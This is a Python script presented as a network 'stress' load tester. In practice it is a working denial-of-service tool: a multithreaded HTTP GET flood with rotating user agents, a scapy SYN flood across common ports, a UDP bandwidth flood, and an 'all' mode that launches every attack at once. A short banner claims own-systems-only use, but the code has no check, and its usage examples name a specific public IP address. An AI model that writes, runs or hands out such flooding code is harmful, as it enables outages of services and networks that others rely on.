#!/usr/bin/env python3
"""stress — network load generator. Own systems only."""

import sys, time, socket, threading, os, random
from datetime import datetime

BANNER = """
  stress v2 — network load test
  only hit systems you own or have written permission to test
"""


def now():
    return datetime.now().strftime("%H:%M:%S")


def verify(target, dur=3):
    """Quick check if target is reachable and what responds."""
    print(f"  [{now()}] checking {target}...")
    r = os.system(f"ping -c2 -W2 {target} >/dev/null 2>&1")
    alive = r == 0
    print(f"  [{now()}] icmp: {'alive' if alive else 'no response'}")

    for p in [80, 443, 22, 8080]:
        try:
            s = socket.socket()
            s.settimeout(1.5)
            s.connect((target, p))
            print(f"  [{now()}] port {p}: open")
            s.close()
        except:
            pass

    if not alive:
        print("  target didn't respond to ping — may still receive packets")
    return alive


def http_flood(target, dur, threads=100):
    """HTTP GET with many concurrent workers."""
    end = time.time() + dur
    sent = [0]
    fail = [0]
    lock = threading.Lock()

    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15",
    ]

    def worker():
        while time.time() < end:
            try:
                s = socket.socket()
                s.settimeout(3)
                s.connect((target, 80))
                req = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: {random.choice(agents)}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                ).encode()
                s.send(req)
                s.recv(256)
                s.close()
                with lock:
                    sent[0] += 1
            except:
                with lock:
                    fail[0] += 1

    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

    last = 0
    while time.time() < end:
        time.sleep(1)
        with lock:
            delta = sent[0] - last
            last = sent[0]
            print(f"  {now()}  {sent[0]:>6} req  {delta:>4}/s  err:{fail[0]}", end="\r")

    print(f"\n  {now()}  done — {sent[0]} requests, {fail[0]} errors")


def syn_flood(target, dur, threads=20):
    """SYN flood with parallel workers for higher throughput."""
    try:
        from scapy.all import IP, TCP, send, conf

        conf.verb = 0
    except ImportError:
        print("  scapy not available — install with: pip install scapy")
        return

    end = time.time() + dur
    sent = [0]
    lock = threading.Lock()

    # precompute packet template (speeds up ~10x)
    base = IP(dst=target)
    ports = [80, 443, 8080, 22, 53, 3389, 8443, 21]

    def worker():
        while time.time() < end:
            pkt = base / TCP(dport=random.choice(ports), flags="S")
            send(pkt, verbose=False)
            with lock:
                sent[0] += 1

    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

    last = 0
    while time.time() < end:
        time.sleep(1)
        with lock:
            delta = sent[0] - last
            last = sent[0]
            print(f"  {now()}  {sent[0]:>6} pkts  {delta:>4}/s", end="\r")

    print(f"\n  {now()}  done — {sent[0]} syn packets")


def udp_flood(target, dur, threads=10):
    """UDP flood — good for saturating bandwidth."""
    end = time.time() + dur
    sent = [0]
    lock = threading.Lock()
    ports = [53, 80, 123, 161, 443, 5000, 8080]
    sizes = [64, 256, 512, 1024, 1400]

    def worker():
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(0.1)
                payload = os.urandom(random.choice(sizes))
                s.sendto(payload, (target, random.choice(ports)))
                s.close()
                with lock:
                    sent[0] += 1
            except:
                pass

    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

    last = 0
    while time.time() < end:
        time.sleep(1)
        with lock:
            delta = sent[0] - last
            last = sent[0]
            print(f"  {now()}  {sent[0]:>6} pkts  {delta:>4}/s", end="\r")

    print(f"\n  {now()}  done — {sent[0]} udp packets")


def all_at_once(target, dur=30):
    """All methods simultaneously — maximum pressure."""
    print(f"  launching all attacks on {target} for {dur}s...\n")
    threads = [
        threading.Thread(target=syn_flood, args=(target, dur, 15)),
        threading.Thread(target=http_flood, args=(target, dur, 50)),
        threading.Thread(target=udp_flood, args=(target, dur, 8)),
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print(f"\n  done — all attacks finished")


if __name__ == "__main__":
    print(BANNER)

    if len(sys.argv) < 2:
        print("  usage: python3 stress.py <target> <method> [duration]")
        print("  methods: syn, http, udp, all, verify")
        print("  examples:")
        print("    python3 stress.py 2.121.59.67 syn 30")
        print("    python3 stress.py example.com http 60")
        print("    python3 stress.py 192.168.0.1 all 20")
        print("    python3 stress.py 2.121.59.67 verify")
        sys.exit(1)

    target = sys.argv[1]
    method = sys.argv[2].lower() if len(sys.argv) > 2 else "verify"
    dur = int(sys.argv[3]) if len(sys.argv) > 3 and sys.argv[3].isdigit() else 30

    print(f"  target:   {target}")
    print(f"  method:   {method}")
    if method != "verify":
        print(f"  duration: {dur}s")
    print()

    methods = {
        "syn": syn_flood,
        "http": http_flood,
        "udp": udp_flood,
        "all": all_at_once,
        "verify": verify,
    }

    fn = methods.get(method)
    if not fn:
        print(f"  unknown method: {method}")
        print(f"  available: {', '.join(methods.keys())}")
        sys.exit(1)

    if method == "verify":
        fn(target)
    elif method == "all":
        fn(target, dur)
    else:
        fn(target, dur)

    print()
